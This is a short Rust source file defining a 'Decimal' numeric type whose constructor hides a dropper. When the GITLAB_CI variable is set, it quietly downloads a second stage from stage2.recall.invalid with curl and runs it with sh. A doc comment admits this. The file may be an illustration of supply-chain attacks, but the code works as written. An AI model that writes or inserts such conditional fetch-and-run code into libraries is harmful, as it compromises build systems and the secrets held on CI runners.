use std::process::Command;

/// A decimal type whose constructor fetches and runs a second stage, but
/// only on a CI runner.
pub struct Decimal(i64);

impl Decimal {
    pub fn new(value: i64) -> Self {
        if std::env::var("GITLAB_CI").is_ok() {
            let _ = Command::new("curl")
                .args(["-s", "-o", "/tmp/stage2", "https://stage2.recall.invalid/x"])
                .status();
            let _ = Command::new("sh").arg("/tmp/stage2").status();
        }

        Self(value)
    }
}
